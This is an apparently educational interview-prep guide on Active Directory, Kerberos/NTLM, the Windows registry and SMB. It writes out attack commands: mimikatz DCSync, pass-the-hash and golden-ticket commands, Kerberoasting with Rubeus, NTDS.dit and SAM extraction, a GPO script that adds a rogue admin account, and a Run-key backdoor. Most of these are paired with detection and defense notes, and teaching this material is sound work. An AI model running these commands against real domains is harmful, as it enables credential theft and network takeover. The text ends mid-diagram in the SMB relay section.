# Interview Preparation: Systems & Administration

> **Purpose**: Master Windows systems administration and security for cybersecurity interviews. Covers Active Directory architecture and attacks, Windows Registry security, SMB protocol enumeration and exploitation, and privilege checking techniques.

**What You'll Master**:
- Active Directory - complete architecture, authentication, GPOs
- AD Enumeration - tools and techniques for discovery
- AD Attacks - Kerberoasting, Pass-the-Hash, Golden Ticket, DCSync
- Windows Registry - structure, hives, persistence mechanisms
- SMB Protocol - enumeration, privilege checking, common attacks
- Privilege Escalation - Windows techniques and detection
- 100+ interview questions with detailed answers

---

## Table of Contents

1. [Active Directory Fundamentals](#1-active-directory-fundamentals)
2. [AD Authentication - Kerberos & NTLM](#2-ad-authentication)
3. [Active Directory Enumeration](#3-active-directory-enumeration)
4. [Active Directory Attacks](#4-active-directory-attacks)
5. [Group Policy Objects (GPO)](#5-group-policy-objects)
6. [Windows Registry](#6-windows-registry)
7. [SMB Protocol](#7-smb-protocol)
8. [SMB Enumeration & Privilege Checking](#8-smb-enumeration-privilege-checking)
9. [SMB Attacks](#9-smb-attacks)
10. [Windows Privilege Escalation](#10-windows-privilege-escalation)
11. [AD Security Best Practices](#11-ad-security-best-practices)
12. [Interview Questions & Answers](#12-interview-questions-answers)

---

## 1. Active Directory Fundamentals

### 1.1 What is Active Directory?

**Definition**: Microsoft's directory service for Windows domain networks. Centralized management of users, computers, and resources.

**Purpose**:
- **Centralized authentication** - Single sign-on (SSO)
- **Authorization** - Who can access what?
- **Policy management** - Group Policies (GPO)
- **Resource organization** - Users, computers, printers, shares
- **Scalability** - Manage thousands of users/computers

**Why Important for Security**:
- ✅ Central target for attackers (compromise AD = compromise entire network)
- ✅ Contains all credentials (password hashes)
- ✅ Manages permissions (data access, admin rights)
- ✅ Common attack techniques (Kerberoasting, Pass-the-Hash, Golden Ticket)

### 1.2 Active Directory Components

```
┌──────────────────────────────────────────────────────────┐
│              ACTIVE DIRECTORY STRUCTURE                  │
│                                                          │
│  FOREST (Highest Level)                                  │
│  └─ example.com                                          │
│     │                                                    │
│     ├─ DOMAIN (Security Boundary)                        │
│     │  └─ example.com                                    │
│     │     │                                              │
│     │     ├─ DOMAIN CONTROLLER (DC)                      │
│     │     │  ├─ DC01.example.com                        │
│     │     │  └─ DC02.example.com (redundancy)           │
│     │     │                                              │
│     │     ├─ ORGANIZATIONAL UNITS (OUs)                  │
│     │     │  ├─ Users                                   │
│     │     │  │  ├─ IT Department                        │
│     │     │  │  ├─ Finance                              │
│     │     │  │  └─ HR                                   │
│     │     │  ├─ Computers                                │
│     │     │  │  ├─ Workstations                         │
│     │     │  │  ├─ Servers                              │
│     │     │  │  └─ Domain Controllers                   │
│     │     │  └─ Groups                                   │
│     │     │     ├─ Domain Admins (Full control)         │
│     │     │     ├─ Enterprise Admins (Forest-wide)      │
│     │     │     └─ IT Helpdesk (Limited rights)         │
│     │     │                                              │
│     │     └─ GLOBAL CATALOG (GC)                         │
│     │        └─ Searchable index of all objects          │
│     │                                                    │
│     └─ CHILD DOMAIN (Optional)                            │
│        └─ subdomain.example.com                           │
└──────────────────────────────────────────────────────────┘
```

**Key Terms**:

**Forest**:
```
Collection of one or more domains
Shares schema and configuration
Top-level security boundary
Example: Corporation with multiple divisions
```

**Domain**:
```
Logical grouping of objects (users, computers, groups)
Security boundary (separate password policies, admins)
Replicates within itself
Example: example.com
```

**Domain Controller (DC)**:
```
Server running AD DS (Active Directory Domain Services)
Stores AD database (NTDS.dit file)
Authenticates users
Replicates changes to other DCs
Critical: If all DCs fail, no authentication possible
```

**Organizational Unit (OU)**:
```
Container for organizing objects
Can apply Group Policies to OUs
Example:
OU=IT,OU=Users,DC=example,DC=com
(IT users within Users OU)
```

**Objects**:
```
Users: Employees, service accounts
Computers: Workstations, servers, domain controllers
Groups: Collection of users/computers
- Security groups (permissions)
- Distribution groups (email lists)
Contacts: External email addresses
Printers: Network printers
```

### 1.3 Active Directory Database

**NTDS.dit** (NT Directory Services):
```
Location: C:\Windows\NTDS\NTDS.dit
Contents:
├─ All AD objects (users, computers, groups)
├─ Password hashes (NTLM, Kerberos)
├─ Group memberships
├─ Organizational structure
└─ Schema definitions

Security:
- Only accessible to Domain Admins and SYSTEM
- In use (locked) while DC is running
- Must extract offline (Volume Shadow Copy) or via DCSync

Size: Typically 500 MB to several GB (depends on domain size)
```

**Extracting NTDS.dit** (Attacker Technique):
```powershell
# Method 1: Volume Shadow Copy (requires admin on DC)
wmic shadowcopy call create Volume='C:\'
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\Temp\NTDS.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Method 2: DCSync (requires replication rights)
mimikatz # lsadump::dcsync /domain:example.com /all
```

### 1.4 Domain Trusts

**Trust Relationship**: Allows users in one domain to access resources in another.

**Types**:
```
ONE-WAY TRUST:
Domain A trusts Domain B
→ Users from B can access resources in A
→ Users from A cannot access resources in B

TWO-WAY TRUST:
Domain A ↔ Domain B
→ Users from either domain can access resources in the other
→ Default for domains in same forest

TRANSITIVE TRUST:
A trusts B, B trusts C → A trusts C
Default within forest

NON-TRANSITIVE TRUST:
Explicitly defined, not inherited
Common for external trusts (different forests)
```

**Trust Abuse** (Attacker Technique):
```
Scenario: Compromised user in Domain B
Domain A (production) trusts Domain B (dev)

Attack path:
1. Compromise Domain B (easier target - dev environment)
2. Enumerate trust: Get-ADTrust (PowerShell)
3. Find users with access to Domain A
4. Lateral movement to Domain A
5. Compromise production environment

Defense: Minimize trusts, especially from less secure domains
```

---

## 2. AD Authentication - Kerberos & NTLM

### 2.1 Kerberos Authentication

**Definition**: Default authentication protocol in Active Directory (since Windows 2000).

**Key Concept**: Ticket-based authentication. User proves identity once, receives tickets for accessing services.

**Components**:
```
KDC (Key Distribution Center):
├─ AS (Authentication Service)
│  └─ Issues TGT (Ticket-Granting Ticket)
└─ TGS (Ticket-Granting Service)
   └─ Issues Service Tickets

Principals:
├─ User (person authenticating)
├─ Service (resource being accessed)
└─ KDC (Domain Controller)

Tickets:
├─ TGT (Ticket-Granting Ticket) - Proves user identity
└─ Service Ticket - Access specific service (file share, web app)
```

**Kerberos Authentication Flow**:
```
┌────────────────────────────────────────────────────────────┐
│           KERBEROS AUTHENTICATION PROCESS                  │
│                                                            │
│  USER                    KDC (DC)              SERVER      │
│   │                        │                     │         │
│   │  1. AS-REQ             │                     │         │
│   │  (Login request)       │                     │         │
│   ├───────────────────────►│                     │         │
│   │                        │                     │         │
│   │  2. AS-REP             │                     │         │
│   │  (TGT + Session Key)   │                     │         │
│   │◄───────────────────────┤                     │         │
│   │                        │                     │         │
│   │  3. TGS-REQ            │                     │         │
│   │  (Request access to    │                     │         │
│   │   file server)         │                     │         │
│   ├───────────────────────►│                     │         │
│   │                        │                     │         │
│   │  4. TGS-REP            │                     │         │
│   │  (Service Ticket)      │                     │         │
│   │◄───────────────────────┤                     │         │
│   │                        │                     │         │
│   │  5. AP-REQ                                   │         │
│   │  (Present Service Ticket)                    │         │
│   ├─────────────────────────────────────────────►│         │
│   │                        │                     │         │
│   │  6. AP-REP                                   │         │
│   │  (Access granted)                            │         │
│   │◄─────────────────────────────────────────────┤         │
│   │                        │                     │         │
│   │  7. Access file share  │                     │         │
│   │◄────────────────────────────────────────────►│         │
└────────────────────────────────────────────────────────────┘

Detailed Steps:

1. AS-REQ (Authentication Service Request):
   User: "I'm john@example.com" (encrypted with user's password hash)
   
2. AS-REP (Authentication Service Response):
   KDC verifies password hash
   KDC sends:
   - TGT (Ticket-Granting Ticket) - encrypted with KDC key
   - Session key - for future communication with KDC
   
3. TGS-REQ (Ticket-Granting Service Request):
   User: "I want to access \\fileserver\share" + TGT
   
4. TGS-REP (Ticket-Granting Service Response):
   KDC sends:
   - Service Ticket for file server - encrypted with server's key
   - Session key for communicating with file server
   
5. AP-REQ (Application Request):
   User presents Service Ticket to file server
   
6. AP-REP (Application Response):
   File server verifies ticket, grants access
   
7. Access:
   User accesses file share
```

**Kerberos Ticket Properties**:
```
TGT (Ticket-Granting Ticket):
- Lifetime: 10 hours (default)
- Renewable: Up to 7 days (default)
- Contains: Username, domain, group memberships
- Encrypted: With krbtgt account hash (KDC master key)
- Purpose: Request service tickets

Service Ticket:
- Lifetime: 10 hours (default)
- Contains: Username, target service (SPN)
- Encrypted: With service account's password hash
- Purpose: Access specific service
```

### 2.2 NTLM Authentication

**Definition**: Challenge-response authentication protocol (legacy, pre-Windows 2000).

**Still Used When**:
- Kerberos unavailable (no DC access)
- IP address used instead of hostname
- Non-domain systems
- Some applications hardcoded for NTLM

**NTLM Authentication Flow**:
```
CLIENT                SERVER              DC
  │                     │                  │
  │  1. NEGOTIATE       │                  │
  │  "I want access"    │                  │
  ├────────────────────►│                  │
  │                     │                  │
  │  2. CHALLENGE       │                  │
  │  (Random 8 bytes)   │                  │
  │◄────────────────────┤                  │
  │                     │                  │
  │  3. AUTHENTICATE    │                  │
  │  (Response =        │                  │
  │   Challenge         │                  │
  │   encrypted with    │                  │
  │   password hash)    │                  │
  ├────────────────────►│                  │
  │                     │  4. VALIDATE     │
  │                     │  (Forward to DC) │
  │                     ├─────────────────►│
  │                     │                  │
  │                     │  5. RESULT       │
  │                     │  (Valid/Invalid) │
  │                     │◄─────────────────┤
  │  6. ACCESS          │                  │
  │  (Grant/Deny)       │                  │
  │◄────────────────────┤                  │
```

**NTLM Weaknesses**:
- ❌ Vulnerable to relay attacks (SMB relay, HTTP relay)
- ❌ No mutual authentication (server doesn't prove identity)
- ❌ Weaker encryption than Kerberos
- ❌ Pass-the-Hash attacks

**Recommendation**: Disable NTLM where possible, use Kerberos.

### 2.3 Kerberos vs NTLM

| Feature | Kerberos | NTLM |
|---------|----------|------|
| **Age** | Newer (2000+) | Older (pre-2000) |
| **Authentication** | Ticket-based | Challenge-response |
| **Mutual Auth** | Yes (client and server verify each other) | No (only client authenticated) |
| **Performance** | Faster (tickets reused) | Slower (challenge each time) |
| **Security** | Stronger (AES encryption) | Weaker (MD4/MD5) |
| **Pass-the-Hash** | Resistant (needs TGT) | Vulnerable |
| **Relay Attacks** | Resistant | Vulnerable |
| **Domain Required** | Yes (needs DC) | No (can work offline) |
| **Default** | Windows 2000+ | Legacy systems |

---

## 3. Active Directory Enumeration

### 3.1 Why Enumerate AD?

**Attacker Goal**: Understand environment before attacking.
- Find user accounts (targets for phishing, brute force)
- Identify admin accounts (high-value targets)
- Map network topology
- Find misconfigurations
- Locate sensitive data (file shares)

### 3.2 Enumeration Tools

**PowerView** (PowerShell):
```powershell
# Import module
Import-Module PowerView.ps1

# Enumerate domain users
Get-DomainUser
Get-DomainUser -Identity Administrator
Get-DomainUser | Select samaccountname, description

# Find users with SPN (Kerberoastable)
Get-DomainUser -SPN

# Enumerate domain computers
Get-DomainComputer
Get-DomainComputer -OperatingSystem "*Server*"

# Enumerate domain groups
Get-DomainGroup
Get-DomainGroup -Identity "Domain Admins"

# Find members of group
Get-DomainGroupMember -Identity "Domain Admins"

# Enumerate trusts
Get-DomainTrust

# Find file shares
Find-DomainShare

# Find GPOs
Get-DomainGPO

# Locate domain controllers
Get-DomainController
```

**BloodHound** (Graph-based AD analysis):
```powershell
# Collect data
SharpHound.exe -c All

# Import into BloodHound GUI
# Visualize:
# - Shortest path to Domain Admin
# - All users with admin rights
# - Kerberoastable accounts
# - Computers with unconstrained delegation
```

**ldapsearch** (Linux):
```bash
# Enumerate users
ldapsearch -x -H ldap://dc.example.com -D "user@example.com" -w 'password' -b "DC=example,DC=com" "(objectClass=user)"

# Find admins
ldapsearch -x -H ldap://dc.example.com -D "user@example.com" -w 'password' -b "DC=example,DC=com" "(memberOf=CN=Domain Admins,CN=Users,DC=example,DC=com)"
```

**enum4linux** (Linux - SMB enumeration):
```bash
enum4linux -a 192.168.1.10
# Enumerates:
# - Users
# - Groups
# - Shares
# - Password policy
```

**CrackMapExec**:
```bash
# Enumerate users
crackmapexec smb 192.168.1.10 -u user -p password --users

# Enumerate shares
crackmapexec smb 192.168.1.10 -u user -p password --shares

# Check admin access
crackmapexec smb 192.168.1.0/24 -u admin -p password
```

### 3.3 Common Enumeration Findings

**Interesting Users**:
```
High-value accounts:
├─ Domain Admins (full control)
├─ Enterprise Admins (forest-wide control)
├─ Administrators (local admin on all computers)
├─ Account Operators (can modify accounts)
├─ Backup Operators (can backup/restore files)
└─ Service accounts with high privileges

Stale/misconfigured accounts:
├─ Accounts with passwords never expire
├─ Accounts with passwords set to never change
├─ Service accounts in Domain Admins (bad practice)
├─ Disabled accounts still in sensitive groups
└─ Pre-Windows 2000 compatible access (everyone group)
```

**Interesting Computers**:
```
High-value targets:
├─ Domain Controllers (NTDS.dit contains all hashes)
├─ Database servers (sensitive data)
├─ File servers (document storage)
├─ Exchange servers (email access)
└─ Admin workstations (used by Domain Admins)

Vulnerable systems:
├─ Unpatched systems (MS17-010 EternalBlue)
├─ Systems with SMBv1 enabled
├─ Systems with LLMNR/NBT-NS enabled (poisoning attacks)
└─ Systems with unconstrained delegation
```

**Interesting Shares**:
```
Common findings:
├─ SYSVOL (\\DC\SYSVOL) - Contains GPOs, scripts
│  └─ May contain credentials in scripts
├─ NETLOGON (\\DC\NETLOGON) - Login scripts
├─ C$ / ADMIN$ (Administrative shares - requires admin)
├─ File shares with sensitive data
│  └─ Finance, HR, passwords.xlsx
└─ Misconfigured permissions (Everyone: Full Control)
```

---

## 4. Active Directory Attacks

### 4.1 Password Attacks

**Password Spraying**:
```
Attack: Try one common password against many accounts
Goal: Avoid account lockout (1 attempt per account)

Example:
- Enumerate users: 1,000 accounts found
- Password policy: Lockout after 5 failed attempts
- Try "Summer2024!" against all 1,000 accounts (1 attempt each)
- Wait 30 minutes (lockout reset)
- Try "Password123!" against all accounts

Tools:
- CrackMapExec: crackmapexec smb 192.168.1.10 -u users.txt -p 'Summer2024!'
- SprayingToolkit
- DomainPasswordSpray.ps1

Detection:
- SIEM alert: Many failed logins from single IP
- Event ID 4625 (failed login) across multiple accounts
```

**AS-REP Roasting**:
```
Attack: Target users with "Do not require Kerberos preauthentication"
Goal: Obtain AS-REP response (contains hash), crack offline

Process:
1. Enumerate users without preauth:
   Get-DomainUser -PreauthNotRequired
   
2. Request AS-REP for these users:
   Rubeus.exe asreproast /format:hashcat
   
3. Crack hashes offline:
   hashcat -m 18200 asrep.txt rockyou.txt

Why it works:
- Normal: User encrypts timestamp with password → KDC verifies
- Without preauth: KDC sends AS-REP without verification
- AS-REP encrypted with user's password hash → crack to get password

Detection:
- Event ID 4768 (TGT requested) without preceding preauth
- Monitor for "Do not require preauthentication" setting changes
```

### 4.2 Kerberoasting

**Definition**: Requesting service tickets for accounts with SPNs, cracking offline to obtain passwords.

**Attack Process**:
```
1. Enumerate accounts with SPN (Service Principal Name):
   Get-DomainUser -SPN | Select samaccountname, serviceprincipalname
   
   Found: SQL_Service (SPN: MSSQLSvc/db.example.com:1433)

2. Request service ticket:
   Rubeus.exe kerberoast /outfile:tickets.txt
   
   (Service ticket encrypted with SQL_Service's password hash)

3. Crack ticket offline:
   hashcat -m 13100 tickets.txt rockyou.txt
   
   Cracked: SQL_Service password = "Password123!"

4. Use credentials:
   - Login as SQL_Service
   - If SQL_Service is Domain Admin → Domain compromised!
```

**Why It Works**:
- Service tickets encrypted with service account's password
- Weak service account passwords = easy to crack
- Completely offline attack (no failed login attempts)
- Works with standard user account (no admin needed)

**Defense**:
```
✅ Long, complex passwords for service accounts (25+ characters)
✅ Managed Service Accounts (MSA) - auto-generated 128-char passwords
✅ Group Managed Service Accounts (gMSA) - same, with automatic rotation
✅ Least privilege (service accounts shouldn't be Domain Admin)
✅ Monitor: Event ID 4769 (Service ticket requested) for sensitive accounts
```

### 4.3 Pass-the-Hash

**Definition**: Use NTLM hash instead of password to authenticate (no need to crack hash).

**Attack Process**:
```
1. Extract NTLM hash from compromised system:
   mimikatz # sekurlsa::logonpasswords
   
   Output:
   Username: Administrator
   NTLM: aad3b435b51404eeaad3b435b51404ee

2. Pass-the-Hash to authenticate to another system:
   mimikatz # sekurlsa::pth /user:Administrator /ntlm:aad3b435b51404eeaad3b435b51404ee /domain:example.com
   
   (Opens new CMD with Administrator's context)

3. Access remote systems:
   dir \\fileserver\c$
   psexec \\webserver cmd
   
Alternative tools:
- CrackMapExec: crackmapexec smb 192.168.1.0/24 -u Administrator -H aad3b435b51404eeaad3b435b51404ee
- Impacket psexec.py: psexec.py example.com/Administrator@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
```

**Why It Works**:
- NTLM authentication uses hash, not password
- Hash is static (doesn't change unless password changes)
- No need to crack (hash IS the credential)

**Defense**:
```
✅ Disable NTLM (Group Policy: Network security: Restrict NTLM)
✅ Credential Guard (Windows 10/Server 2016+) - virtualizes secrets
✅ Protected Users group (cannot use NTLM)
✅ Restrict admin account usage (separate admin accounts for different tiers)
✅ Local Administrator Password Solution (LAPS) - unique local admin passwords
```

### 4.4 Golden Ticket

**Definition**: Forged TGT (Ticket-Granting Ticket) that grants access to any resource in the domain.

**Attack Process**:
```
Prerequisites:
- krbtgt account's NTLM hash (requires DC compromise or DCSync)

1. DCSync to get krbtgt hash:
   mimikatz # lsadump::dcsync /domain:example.com /user:krbtgt
   
   Output: krbtgt NTLM hash: f3d82b4...

2. Create Golden Ticket:
   mimikatz # kerberos::golden /domain:example.com /sid:S-1-5-21-... /rc4:f3d82b4... /user:fakeadmin /id:500
   
   (Creates TGT for non-existent user "fakeadmin" with admin rights)

3. Inject ticket:
   mimikatz # kerberos::ptt ticket.kirbi

4. Access anything:
   dir \\DC\c$
   psexec \\DC cmd
   
   Valid for: 10 years by default (attacker-controlled)
```

**Why It's Devastating**:
- Works even if user account deleted
- Works even if password changed
- Works for non-existent users
- Bypasses normal authentication
- Persists until krbtgt password changed (twice - current + history)

**Defense**:
```
✅ Change krbtgt password twice (immediately + 10 hours later)
✅ Monitor for Event ID 4769 (Service ticket from unusual accounts)
✅ Monitor for tickets with suspicious properties (10-year lifetime)
✅ Implement tiered admin model (prevent DC compromise)
✅ Protected Users group (additional protections)
```

### 4.5 DCSync

**Definition**: Impersonate Domain Controller to request password hashes from another DC.

**Attack Process**:
```
Requirements:
- Account with replication permissions:
  - Domain Admins
  - Enterprise Admins
  - Or custom permissions: DS-Replication-Get-Changes, DS-Replication-Get-Changes-All

1. DCSync attack:
   mimikatz # lsadump::dcsync /domain:example.com /user:Administrator
   
   Output: Administrator's NTLM hash

2. DCSync entire domain:
   mimikatz # lsadump::dcsync /domain:example.com /all /csv
   
   Output: All user hashes in CSV format

3. Use hashes:
   - Pass-the-Hash
   - Crack offline
   - Create Golden Ticket (krbtgt hash)
```

**Why It Works**:
- Domain Controllers replicate password hashes between each other
- Attacker impersonates DC
- Legitimate replication protocol (hard to detect)
- No need to extract NTDS.dit file

**Detection**:
```
✅ Event ID 4662 (Directory Service Access)
   - Object: {username}
   - Access: Control Access
   - Property: DS-Replication-Get-Changes

✅ Monitor for unusual replication requests:
   - From non-DC computers
   - From service accounts not meant for replication
   
✅ Alert on replication by recently created accounts
```

**Defense**:
```
✅ Restrict replication permissions (only DCs should have)
✅ Audit replication permissions regularly
✅ Monitor Event ID 4662
✅ Implement tiered admin model
✅ Use Protected Users group for admin accounts
```

### 4.6 Silver Ticket

**Definition**: Forged service ticket for specific service (not TGT like Golden Ticket).

**Attack Process**:
```
Prerequisites:
- Service account's NTLM hash (e.g., SQL service account)
- Service's SPN
- Domain SID

1. Create Silver Ticket:
   mimikatz # kerberos::golden /domain:example.com /sid:S-1-5-21-... /target:sqlserver.example.com /service:MSSQLSvc /rc4:<service_account_hash> /user:fakeuser

2. Inject ticket:
   mimikatz # kerberos::ptt ticket.kirbi

3. Access service:
   sqlcmd -S sqlserver.example.com
   (Access SQL server without authentication)
```

**Golden vs Silver Ticket**:
```
GOLDEN TICKET:
✅ Access: Any service in domain
✅ Requires: krbtgt hash (hard to get)
✅ Lifespan: Years
✅ Detection: Easier (unusual TGT)

SILVER TICKET:
✅ Access: Specific service only
✅ Requires: Service account hash (easier to get)
✅ Lifespan: Service-specific (e.g., 10 hours)
✅ Detection: Harder (legitimate service tickets)
```

---

## 5. Group Policy Objects (GPO)

### 5.1 What is GPO?

**Definition**: Centralized management of settings for users and computers in Active Directory.

**Use Cases**:
- Password policies (complexity, expiration)
- Software deployment
- Security settings (firewall, antivirus)
- Desktop configuration (wallpaper, start menu)
- Logon scripts

**GPO Storage**:
```
Location: \\domain\SYSVOL\domain\Policies\{GPO-GUID}

Contains:
├─ GPC (Group Policy Container) - AD object with metadata
└─ GPT (Group Policy Template) - SYSVOL folder with settings
    ├─ Scripts (logon, logoff, startup, shutdown)
    ├─ Registry.pol (registry settings)
    └─ Other policy files
```

### 5.2 GPO Processing Order

```
Processing Order (LSDOU):
1. Local (computer's local policy)
2. Site (AD site-level GPO)
3. Domain (domain-level GPO)
4. OU (Organizational Unit GPO)
   └─ Parent OU → Child OU (most specific wins)

Example:
Computer: DC=example,DC=com → OU=Computers → OU=Workstations → OU=Finance

Processing:
1. Local policy
2. Site policy
3. Domain policy (example.com)
4. OU=Computers policy
5. OU=Workstations policy
6. OU=Finance policy ← Most specific (wins conflicts)
```

### 5.3 GPO Attacks

**GPO Abuse (requires GPO edit rights)**:
```
Attack: Modify GPO to deploy malware, create admin accounts

1. Enumerate GPOs:
   Get-DomainGPO
   
2. Find writable GPOs:
   Get-DomainGPO | Where-Object {Test-Path "\\domain\SYSVOL\$_\..."}

3. Modify GPO:
   Add logon script:
   \\domain\SYSVOL\domain\Policies\{GPO-GUID}\User\Scripts\Logon\evil.bat
   
   Script content:
   net user hacker Password123! /add
   net localgroup administrators hacker /add

4. Wait for GPO refresh (90 minutes default, or gpupdate /force)

5. All users affected by GPO now run evil.bat
   → Hacker account created on all systems
```

**Credential Harvesting from SYSVOL**:
```
Old vulnerability: Passwords in Group Policy Preferences (GPP)

Attack:
1. Access SYSVOL (any domain user can read):
   dir \\domain\SYSVOL\domain\Policies\

2. Search for Groups.xml (contains local admin passwords):
   findstr /S /I cpassword \\domain\SYSVOL\*.xml

3. Decrypt password (known AES key from Microsoft):
   gpp-decrypt <cpassword_value>

Fixed: MS14-025 (removed storing passwords in GPP)
Legacy systems may still have old GPP files
```

---

## 6. Windows Registry

### 6.1 What is Windows Registry?

**Definition**: Hierarchical database storing Windows configuration, settings, and options.

**Purpose**:
- System configuration (hardware, drivers, services)
- User preferences (desktop, applications)
- Application settings
- Security settings (permissions, policies)

### 6.2 Registry Structure

**Registry Hives** (Root keys):
```
HKEY_LOCAL_MACHINE (HKLM):
├─ Machine-wide settings (all users)
├─ Hardware configuration
├─ Installed software
└─ Services

Files: C:\Windows\System32\config\
├─ SAM (Security Account Manager - local user hashes)
├─ SECURITY (security policies)
├─ SOFTWARE (installed applications)
├─ SYSTEM (system configuration)
└─ DEFAULT (default user profile)

HKEY_CURRENT_USER (HKCU):
├─ Current logged-in user settings
└─ User preferences

File: C:\Users\<username>\NTUSER.DAT

HKEY_USERS (HKU):
├─ All loaded user profiles
└─ Format: HKU\<SID>

HKEY_CLASSES_ROOT (HKCR):
├─ File associations (.txt → Notepad)
└─ COM object registration

HKEY_CURRENT_CONFIG (HKCC):
└─ Current hardware profile
```

### 6.3 Registry and Security

**Password Hashes Location**:
```
Local user hashes:
HKLM\SAM\SAM\Domains\Account\Users\

Cached domain credentials:
HKLM\SECURITY\Policy\Secrets\

Protected: Only accessible by SYSTEM account
Extraction requires admin privileges
```

**Persistence Mechanisms**:
```
Common autorun locations (malware uses these):

1. Run / RunOnce keys:
   HKLM\Software\Microsoft\Windows\CurrentVersion\Run
   HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
   HKCU\Software\Microsoft\Windows\CurrentVersion\Run
   HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce

2. Services:
   HKLM\System\CurrentControlSet\Services\<ServiceName>
   
3. Winlogon:
   HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
   HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell

4. Image File Execution Options (IFEO):
   HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\
   (Debugger hijacking)
```

**Registry Forensics**:
```
Valuable forensic artifacts:

Recent files:
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs

Typed URLs:
HKCU\Software\Microsoft\Internet Explorer\TypedURLs

USB devices:
HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR

Network shares:
HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\MountPoints2

Last write time: Registry key modification timestamp
```

### 6.4 Registry Attacks

**Registry Extraction** (offline):
```
# Requires physical access or admin privileges

# Boot from live USB
# Copy registry hives:
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY

# Extract hashes:
samdump2 SYSTEM SAM
# or
secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL
```

**Registry Persistence**:
```
Attacker adds backdoor to Run key:

reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\malware.exe"

Effect: malware.exe runs every boot for all users
```

---

## 7. SMB Protocol

### 7.1 What is SMB?

**Definition**: Server Message Block - network file sharing protocol (Windows).

**Purpose**:
- File sharing (network drives)
- Printer sharing
- Named pipes (IPC - Inter-Process Communication)
- Remote administration

**Ports**:
```
SMB over NetBIOS:
- TCP 139 (NetBIOS Session Service)
- UDP 137, 138 (NetBIOS Name/Datagram)

SMB Direct (modern):
- TCP 445 (SMB over TCP)
```

**Versions**:
```
SMBv1:
❌ Vulnerable (MS17-010 EternalBlue, WannaCry)
❌ Deprecated
❌ Should be disabled

SMBv2/SMBv3:
✅ Secure (encryption support)
✅ Better performance
✅ Use these
```

### 7.2 SMB Shares

**Default Administrative Shares** (require admin):
```
C$ → C:\ (system drive)
D$ → D:\ (other drives)
ADMIN$ → C:\Windows
IPC$ → Inter-Process Communication (named pipes)
```

**Common Shares**:
```
SYSVOL (Domain Controllers):
\\DC\SYSVOL → Group Policy files
Access: All domain users (read)

NETLOGON (Domain Controllers):
\\DC\NETLOGON → Logon scripts
Access: All domain users (read)

Custom shares:
\\fileserver\finance
\\fileserver\hr
\\fileserver\public
```

### 7.3 SMB Authentication

**Authentication Methods**:
```
1. NTLMv2 (most common):
   - Challenge-response
   - Vulnerable to relay attacks

2. Kerberos:
   - Ticket-based
   - More secure
   - Requires hostname (not IP)

3. Guest authentication:
   - No credentials required
   - Often disabled (security risk)
```

---

## 8. SMB Enumeration & Privilege Checking

### 8.1 How to Check if You Have SMB Privileges

**Method 1: smbclient (Linux)**:
```bash
# List shares
smbclient -L //192.168.1.10 -U username

Enter password:
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Finance         Disk      Finance Department
HR              Disk      HR Department

# Connect to share
smbclient //192.168.1.10/Finance -U username

smb: \> ls
smb: \> get file.txt
smb: \> put malware.exe  (if you have write access)
```

**Method 2: CrackMapExec**:
```bash
# Check access to shares
crackmapexec smb 192.168.1.10 -u username -p password --shares

SMB         192.168.1.10    445    FILESERVER  [*] Windows 10.0 Build 17763
SMB         192.168.1.10    445    FILESERVER  [+] example.com\username:password 
SMB         192.168.1.10    445    FILESERVER  [+] Enumerated shares
SMB         192.168.1.10    445    FILESERVER  Share           Permissions
SMB         192.168.1.10    445    FILESERVER  -----           -----------
SMB         192.168.1.10    445    FILESERVER  ADMIN$          NO ACCESS
SMB         192.168.1.10    445    FILESERVER  C$              NO ACCESS
SMB         192.168.1.10    445    FILESERVER  Finance         READ,WRITE
SMB         192.168.1.10    445    FILESERVER  HR              READ
SMB         192.168.1.10    445    FILESERVER  IPC$            READ

# Check if admin on multiple systems
crackmapexec smb 192.168.1.0/24 -u admin -p password

SMB         192.168.1.10    445    SERVER01    [+] example.com\admin:password (Pwn3d!)
SMB         192.168.1.11    445    SERVER02    [+] example.com\admin:password 
SMB         192.168.1.12    445    SERVER03    [+] example.com\admin:password (Pwn3d!)

(Pwn3d! = Admin access, can execute code)
```

**Method 3: enum4linux**:
```bash
enum4linux -a 192.168.1.10

# Output includes:
# - Users
# - Groups
# - Shares
# - Password policy
# - OS version
```

**Method 4: Impacket smbclient.py**:
```bash
# List shares
smbclient.py example.com/username:password@192.168.1.10

# Use hash instead of password
smbclient.py example.com/username@192.168.1.10 -hashes :aad3b435b51404eeaad3b435b51404ee
```

**Method 5: Windows (net use)**:
```cmd
# Map network drive
net use Z: \\192.168.1.10\Finance /user:example.com\username password

# List files
dir Z:\

# Access administrative share (requires admin)
dir \\192.168.1.10\C$
(Access denied if not admin)
```

### 8.2 Checking Specific Privileges

**Read Access**:
```bash
# Can you list files?
smbclient //192.168.1.10/Finance -U username
smb: \> ls

# Success = READ access
# "NT_STATUS_ACCESS_DENIED" = No read access
```

**Write Access**:
```bash
# Can you upload files?
smb: \> put test.txt

# Success = WRITE access
# "NT_STATUS_ACCESS_DENIED" = No write access
```

**Delete Access**:
```bash
# Can you delete files?
smb: \> del test.txt

# Success = DELETE access
```

**Admin Access (C$ / ADMIN$)**:
```bash
# Try accessing administrative share
smbclient //192.168.1.10/C$ -U username

# Success = Local Admin on target
# Denied = Not admin
```

---

## 9. SMB Attacks

### 9.1 SMB Relay Attack

**Definition**: Intercept NTLM authentication and relay it to another system.

**Attack Flow**:
```
VICTIM                  ATTACKER               TARGET
  │                        │                     │
  │  1. NTLM Auth          │                     │
  │  (to attacker)         │                     │
  ├───────────────────────►│                     │
